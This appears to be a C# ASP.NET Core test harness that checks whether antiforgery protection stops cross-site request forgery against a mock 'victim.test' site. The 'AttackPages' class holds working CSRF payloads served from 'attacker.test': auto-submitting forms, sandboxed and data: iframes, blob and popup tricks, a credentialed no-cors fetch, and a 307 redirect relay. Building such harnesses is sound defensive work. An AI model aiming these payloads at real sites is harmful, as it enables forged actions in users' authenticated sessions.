using System.Collections.Concurrent;
using System.Security.Claims;
using Microsoft.AspNetCore.Antiforgery;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Mvc;

const string CookieScheme = "R64Cookie";

var builder = WebApplication.CreateBuilder(args);
builder.Services
    .AddAuthentication(CookieScheme)
    .AddCookie(CookieScheme, options =>
    {
        options.Cookie.Name = "R64.Auth";
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        options.Cookie.SameSite = SameSiteMode.None;
        options.Events.OnRedirectToLogin = context =>
        {
            context.Response.StatusCode = StatusCodes.Status401Unauthorized;
            return Task.CompletedTask;
        };
        options.Events.OnRedirectToAccessDenied = context =>
        {
            context.Response.StatusCode = StatusCodes.Status403Forbidden;
            return Task.CompletedTask;
        };
    });
builder.Services.AddAuthorization();

var app = builder.Build();

app.UseAuthentication();
app.Use(async (context, next) =>
{
    RequestRecord? record = null;
    if (R64Hosts.IsVictim(context) && HttpMethods.IsPost(context.Request.Method))
    {
        record = R64State.BeginRecord(context);
    }

    try
    {
        await next(context);
    }
    catch (Exception exception)
    {
        if (record is not null)
        {
            record.Exception = $"{exception.GetType().FullName}: {exception.Message}";
        }
        throw;
    }
    finally
    {
        if (record is not null)
        {
            R64State.CompleteRecord(record, context);
        }
    }
});
app.UseAuthorization();

app.MapGet("/health", () => Results.Json(new { ok = true, framework = Environment.Version.ToString() }));

app.MapGet("/login", async Task<IResult> (HttpContext context) =>
{
    if (!R64Hosts.IsVictim(context))
    {
        return Results.NotFound();
    }

    var identity = new ClaimsIdentity(
        [new Claim(ClaimTypes.NameIdentifier, "victim-user"), new Claim(ClaimTypes.Name, "victim")],
        CookieScheme);
    await context.SignInAsync(
        CookieScheme,
        new ClaimsPrincipal(identity),
        new AuthenticationProperties { IsPersistent = true });

    return Results.Text("logged-in", "text/plain");
});

app.MapGet("/reset", (HttpContext context) =>
{
    if (!R64Hosts.IsVictim(context))
    {
        return Results.NotFound();
    }

    R64State.Reset();
    return Results.Json(new { reset = true });
});

app.MapGet("/state", (HttpContext context) =>
{
    if (!R64Hosts.IsVictim(context))
    {
        return Results.NotFound();
    }

    return Results.Json(R64State.Snapshot());
});

app.MapPost("/protected/form", R64Handlers.ProtectedForm)
    .RequireAuthorization();

app.MapPost("/protected/json", R64Handlers.ProtectedJson)
    .RequireAuthorization();

app.MapPost("/relay307", (HttpContext context) =>
{
    if (!R64Hosts.IsAttacker(context))
    {
        return Results.NotFound();
    }

    return Results.Redirect(
        "https://victim.test:5001/protected/form",
        permanent: false,
        preserveMethod: true);
});

app.MapGet("/attack/{kind}", (string kind, HttpContext context) =>
{
    if (!R64Hosts.IsAttacker(context))
    {
        return Results.NotFound();
    }

    context.Response.Headers.CacheControl = "no-store";
    return Results.Content(AttackPages.Render(kind), "text/html; charset=utf-8");
});

app.Run();

internal static class R64Hosts
{
    public static bool IsVictim(HttpContext context) =>
        string.Equals(context.Request.Host.Host, "victim.test", StringComparison.OrdinalIgnoreCase)
        && context.Request.Host.Port == 5001;

    public static bool IsAttacker(HttpContext context) =>
        string.Equals(context.Request.Host.Host, "attacker.test", StringComparison.OrdinalIgnoreCase)
        && context.Request.Host.Port == 5002;
}

internal static class R64Handlers
{
    [RequireAntiforgeryToken]
    public static IResult ProtectedForm([FromForm] string marker, HttpContext context)
    {
        if (!R64Hosts.IsVictim(context))
        {
            return Results.NotFound();
        }

        return R64State.Mutate("form", marker, context);
    }

    [RequireAntiforgeryToken]
    public static IResult ProtectedJson(JsonPayload payload, HttpContext context)
    {
        if (!R64Hosts.IsVictim(context))
        {
            return Results.NotFound();
        }

        var verdict = context.Features.Get<IAntiforgeryValidationFeature>();
        if (verdict is not { IsValid: true })
        {
            return Results.BadRequest(new
            {
                error = verdict?.Error?.Message ?? "missing-antiforgery-verdict"
            });
        }

        return R64State.Mutate("json", payload.Marker, context);
    }
}

internal static class R64State
{
    private static readonly ConcurrentQueue<RequestRecord> Records = new();
    private static readonly ConcurrentQueue<MutationRecord> Mutations = new();
    private static int _mutationCount;

    public static RequestRecord BeginRecord(HttpContext context)
    {
        var record = new RequestRecord
        {
            AtUtc = DateTimeOffset.UtcNow,
            Method = context.Request.Method,
            Path = context.Request.Path.Value ?? string.Empty,
            Host = context.Request.Host.Value,
            Origin = context.Request.Headers.Origin.ToString(),
            Referer = context.Request.Headers.Referer.ToString(),
            SecFetchSite = context.Request.Headers["Sec-Fetch-Site"].ToString(),
            SecFetchMode = context.Request.Headers["Sec-Fetch-Mode"].ToString(),
            SecFetchDest = context.Request.Headers["Sec-Fetch-Dest"].ToString(),
            ContentType = context.Request.ContentType ?? string.Empty,
            Authenticated = context.User.Identity?.IsAuthenticated == true,
            UserName = context.User.Identity?.Name,
        };
        Records.Enqueue(record);
        return record;
    }

    public static void CompleteRecord(RequestRecord record, HttpContext context)
    {
        var verdict = context.Features.Get<IAntiforgeryValidationFeature>();
        record.StatusCode = context.Response.StatusCode;
        record.AntiforgeryFeaturePresent = verdict is not null;
        record.AntiforgeryIsValid = verdict?.IsValid;
        record.AntiforgeryError = verdict?.Error?.Message;
    }

    public static IResult Mutate(string endpoint, string marker, HttpContext context)
    {
        var next = Interlocked.Increment(ref _mutationCount);
        Mutations.Enqueue(new MutationRecord
        {
            Number = next,
            Endpoint = endpoint,
            Marker = marker,
            UserName = context.User.Identity?.Name,
            SecFetchSite = context.Request.Headers["Sec-Fetch-Site"].ToString(),
            Origin = context.Request.Headers.Origin.ToString(),
        });
        return Results.Json(new { mutated = true, number = next, endpoint, marker });
    }

    public static void Reset()
    {
        Interlocked.Exchange(ref _mutationCount, 0);
        Records.Clear();
        Mutations.Clear();
    }

    public static object Snapshot() => new
    {
        mutationCount = Volatile.Read(ref _mutationCount),
        mutations = Mutations.ToArray(),
        requests = Records.ToArray(),
    };
}

internal sealed class JsonPayload
{
    public string Marker { get; init; } = string.Empty;
}

internal sealed class RequestRecord
{
    public DateTimeOffset AtUtc { get; init; }
    public string Method { get; init; } = string.Empty;
    public string Path { get; init; } = string.Empty;
    public string Host { get; init; } = string.Empty;
    public string Origin { get; init; } = string.Empty;
    public string Referer { get; init; } = string.Empty;
    public string SecFetchSite { get; init; } = string.Empty;
    public string SecFetchMode { get; init; } = string.Empty;
    public string SecFetchDest { get; init; } = string.Empty;
    public string ContentType { get; init; } = string.Empty;
    public bool Authenticated { get; init; }
    public string? UserName { get; init; }
    public int StatusCode { get; set; }
    public bool AntiforgeryFeaturePresent { get; set; }
    public bool? AntiforgeryIsValid { get; set; }
    public string? AntiforgeryError { get; set; }
    public string? Exception { get; set; }
}

internal sealed class MutationRecord
{
    public int Number { get; init; }
    public string Endpoint { get; init; } = string.Empty;
    public string Marker { get; init; } = string.Empty;
    public string? UserName { get; init; }
    public string SecFetchSite { get; init; } = string.Empty;
    public string Origin { get; init; } = string.Empty;
}

internal static class AttackPages
{
    private const string VictimForm = "https://victim.test:5001/protected/form";

    public static string Render(string kind) => kind switch
    {
        "form-auto" => Page($"""
            <form id="attack" method="post" action="{VictimForm}">
              <input name="marker" value="form-auto">
            </form>
            <script>document.getElementById('attack').submit()</script>
            """),

        "form-click" => Page($"""
            <form method="post" action="{VictimForm}">
              <input name="marker" value="form-click">
              <button id="go" type="submit">go</button>
            </form>
            """),

        "sandbox-script" => Page($"""
            <iframe id="box" sandbox="allow-forms allow-scripts" srcdoc="
              &lt;form id='attack' method='post' action='{VictimForm}'&gt;
                &lt;input name='marker' value='sandbox-script'&gt;
              &lt;/form&gt;
              &lt;script&gt;document.getElementById('attack').submit()&lt;/script&gt;
            "></iframe>
            """),

        "sandbox-click" => Page($"""
            <iframe id="box" sandbox="allow-forms" srcdoc="
              &lt;form method='post' action='{VictimForm}'&gt;
                &lt;input name='marker' value='sandbox-click'&gt;
                &lt;button id='go' type='submit'&gt;go&lt;/button&gt;
              &lt;/form&gt;
            "></iframe>
            """),

        "data-iframe" => Page($"""
            <iframe id="box" src="data:text/html,{Uri.EscapeDataString($"<form id='attack' method='post' action='{VictimForm}'><input name='marker' value='data-iframe'></form><script>document.getElementById('attack').submit()</script>")}"></iframe>
            """),

        "blob-top" => Page($"""
            <script>
              const html = `<form id="attack" method="post" action="{VictimForm}"><input name="marker" value="blob-top"></form><script>document.getElementById('attack').submit()<\/script>`;
              location.href = URL.createObjectURL(new Blob([html], {{type: 'text/html'}}));
            </script>
            """),

        "popup-write" => Page($"""
            <button id="go">open</button>
            <script>
              document.getElementById('go').onclick = () => {{
                const popup = window.open('about:blank', '_blank');
                popup.document.write(`<form id="attack" method="post" action="{VictimForm}"><input name="marker" value="popup-write"></form><script>document.getElementById('attack').submit()<\/script>`);
                popup.document.close();
              }};
            </script>
            """),

        "fetch-no-cors" => Page($"""
            <script>
              fetch('{VictimForm}', {{
                method: 'POST',
                mode: 'no-cors',
                credentials: 'include',
                headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                body: 'marker=fetch-no-cors'
              }}).catch(() => {{}});
            </script>
            """),

        "redirect307" => Page("""
            <form id="attack" method="post" action="https://attacker.test:5002/relay307">
              <input name="marker" value="redirect307">
            </form>
            <script>document.getElementById('attack').submit()</script>
            """),

        _ => Page("<p>unknown attack kind</p>"),
    };

    private static string Page(string body) => $"""
        <!doctype html>
        <html>
          <head><meta charset="utf-8"><title>R64 attacker</title></head>
          <body>{body}</body>
        </html>
        """;
}
